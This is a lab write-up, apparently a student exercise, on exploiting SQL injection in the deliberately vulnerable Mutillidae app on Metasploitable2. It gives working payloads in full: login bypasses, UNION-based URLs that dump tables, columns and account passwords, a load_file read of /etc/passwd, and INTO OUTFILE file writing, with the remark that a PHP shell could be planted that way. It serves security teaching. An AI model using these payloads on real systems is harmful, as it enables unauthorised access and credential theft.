# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![280733625-4a15545a-d946-4031-8dfe-d1469d743301](https://github.com/Aakash0407/sqlinjection/assets/118799103/2fd1cd2a-a223-4d1a-acd4-3ec1bae620da)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
![280733888-716e9eba-4725-46c1-a327-9c62708ac1e9](https://github.com/Aakash0407/sqlinjection/assets/118799103/af22e478-7e90-4829-8e82-181d859bf640)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![280733988-a1d37233-9611-45eb-b707-d0b39afab99b](https://github.com/Aakash0407/sqlinjection/assets/118799103/0ee350c8-7e57-4690-9a10-ea9f0be22ad6)
Click on the menu Login/Register and register for an account
![280734126-e35398b4-9245-459e-b16d-31c4a926b56a](https://github.com/Aakash0407/sqlinjection/assets/118799103/5e8095c1-64b9-440a-ab78-735bae04acb6)
Click on the link “Please register here” 
![280734264-d010b01e-f1d1-4d59-bf47-c17f8795e92a](https://github.com/Aakash0407/sqlinjection/assets/118799103/cff48114-5c15-4f3a-8c7c-bfbe98b82956)
Click on “Create Account” to display the following page:
![280734451-0aec6c4d-ac55-4614-893d-1459a1f65c6a](https://github.com/Aakash0407/sqlinjection/assets/118799103/909fce88-5e6b-4d53-96a1-b5b018803de7)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![280734553-3f367d29-88b3-4c4d-ad96-9e8e17b320b7](https://github.com/Aakash0407/sqlinjection/assets/118799103/85548a9a-6d4c-494a-ba31-6d76adea0dc6)

Click “Login”. The logged in page will show as below:
![280734633-02c2f7b1-a819-4d73-80f4-70a09ebe6453](https://github.com/Aakash0407/sqlinjection/assets/118799103/b0814849-5d48-43a4-9c17-0d1bbd19bb32)

## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![280734724-6d18f748-bb0a-459c-8780-be45224cfab0](https://github.com/Aakash0407/sqlinjection/assets/118799103/58a7bf3e-73b3-443c-9a84-e8758c874645)

Click the login button and you will see it enter into the administrator page.
![280734785-0101f9bd-2c1a-4f3a-8235-04589de26a0b](https://github.com/Aakash0407/sqlinjection/assets/118799103/819eeaae-3b75-4e90-87d0-8c9993a6994b)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![280734938-e094a740-ed30-4263-8d92-470e5e55102e](https://github.com/Aakash0407/sqlinjection/assets/118799103/c70a86a4-b4ee-4344-9ad8-e78e7c59ccf3)
![280734997-721c4c81-add1-42bc-9dba-139670f99883](https://github.com/Aakash0407/sqlinjection/assets/118799103/5a678ed3-b237-4037-984c-93c12d3d0922)
![280735124-77321afa-3568-46af-ad02-d551d966fabf](https://github.com/Aakash0407/sqlinjection/assets/118799103/94cb4773-3699-4ad5-ad93-d0a91c5f28dc)
![280735150-8d7e8361-297a-4628-bec9-3f6ca0557f9f](https://github.com/Aakash0407/sqlinjection/assets/118799103/6e8ae782-6f7a-416a-a48a-4785492b3e6f)
![280735170-cf0eed7e-cb51-42fe-b81f-50a3c0c8eff1](https://github.com/Aakash0407/sqlinjection/assets/118799103/7f47e7d5-168a-48b5-853b-a92fa181a45f)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![280735235-9e875685-d903-42ab-a94f-971f5fde92c8](https://github.com/Aakash0407/sqlinjection/assets/118799103/0012dbd9-6e50-419d-9532-bb3adf041122)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![280735334-dee4a69f-8908-4783-9ea9-653380b2f774](https://github.com/Aakash0407/sqlinjection/assets/118799103/9e519caa-f9c3-4f88-917e-32ef89dc1755)
After adding the order by 6 into the existing url , the following error statement will be obtained: 
![280735394-95d0ada5-4ac6-4ac3-965e-2a4e355face5](https://github.com/Aakash0407/sqlinjection/assets/118799103/696647a7-e8f6-43a4-8f1a-af4e0fcfdff0)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6. 
![280735462-5fdd0bc3-a864-49c1-b52b-0f99af21ee28](https://github.com/Aakash0407/sqlinjection/assets/118799103/dd0d4035-cf5a-4fa1-92d5-b56999d86175)

As it is having 5 columns the query worked fine and it provides the correct result
![280735525-8b167303-5c75-4f29-8a92-02502ffc3dae](https://github.com/Aakash0407/sqlinjection/assets/118799103/f8d50267-2075-4a4f-8cef-23adcb13751a)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![280735565-9c069767-0b4b-479c-9933-c8522b271a94](https://github.com/Aakash0407/sqlinjection/assets/118799103/b2e1a813-b602-466f-8fbd-68b38e296a95)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![280735696-d7f3fa30-5de9-4f07-85ef-12970758b690](https://github.com/Aakash0407/sqlinjection/assets/118799103/6cd32012-74b6-4973-9d18-6134272966f8)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![280735889-0877220e-86b4-4257-81a2-4276f2d4a4cb](https://github.com/Aakash0407/sqlinjection/assets/118799103/a2d8783b-0597-442f-9479-ccfa7a5b061b)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![280735968-af8e7700-bc67-410a-88d6-f356d882e626](https://github.com/Aakash0407/sqlinjection/assets/118799103/6c11c228-b0fb-4357-9fb3-665ce5e53d6b)


The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![280736042-d14eb27d-41a1-4ba3-9776-16fb5585588d](https://github.com/Aakash0407/sqlinjection/assets/118799103/fb983bc6-d186-43ec-b423-e8f0d9d1b1a9)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![280736082-e7aa1889-af16-44fc-99b9-221e389a5db4](https://github.com/Aakash0407/sqlinjection/assets/118799103/f82920c5-104b-487b-8b90-24aef8f0d6d5)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![280736123-14790d68-e91d-46f6-b071-92e143a8b894](https://github.com/Aakash0407/sqlinjection/assets/118799103/0e442fb8-394e-4b8a-bd44-fc70f84a6ab8)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![280736280-b4044c51-49cf-4e43-abec-9748a04d298f](https://github.com/Aakash0407/sqlinjection/assets/118799103/b35f58f7-0446-4809-bc99-4262c2cff1a3)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
